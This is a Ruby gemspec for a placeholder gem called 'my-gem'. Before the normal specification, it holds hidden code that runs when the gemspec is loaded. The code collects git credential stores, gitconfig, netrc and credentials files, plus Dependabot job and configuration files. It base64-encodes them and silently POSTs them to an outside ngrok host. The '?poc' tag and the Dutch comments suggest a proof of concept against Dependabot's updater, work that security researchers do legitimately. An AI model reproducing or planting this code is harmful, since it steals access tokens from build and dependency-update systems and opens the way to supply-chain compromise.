COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "uri"

  results = []

  # Git credential store - bevat plaintext token
  Dir.glob("/home/dependabot/dependabot-updater/*.git.store").each do |f|
    content = File.read(f) rescue "ERR"
    results << "=== GIT STORE: #{f} ===\n#{content}"
  end

  # Gitconfig files in tmp
  Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").each do |f|
    content = File.read(f) rescue "ERR"
    results << "=== GITCONFIG: #{f} ===\n#{content}"
  end

  # Alle .store en .gitconfig bestanden overal
  Dir.glob("/home/dependabot/**/*.{store,gitconfig,netrc,credentials}").each do |f|
    content = File.read(f) rescue "ERR"
    results << "=== #{f} ===\n#{content}"
  end

  # job.json nogmaals
  results << "=== job.json ===\n#{File.read('/home/dependabot/dependabot-updater/job.json')}" rescue nil

  # output.json
  results << "=== output.json ===\n#{File.read('/home/dependabot/dependabot-updater/output/output.json')}" rescue nil

  # environment.rb - hoe worden credentials geladen?
  results << "=== environment.rb ===\n#{File.read('/home/dependabot/dependabot-updater/lib/dependabot/environment.rb')}" rescue nil

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=gitstore")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
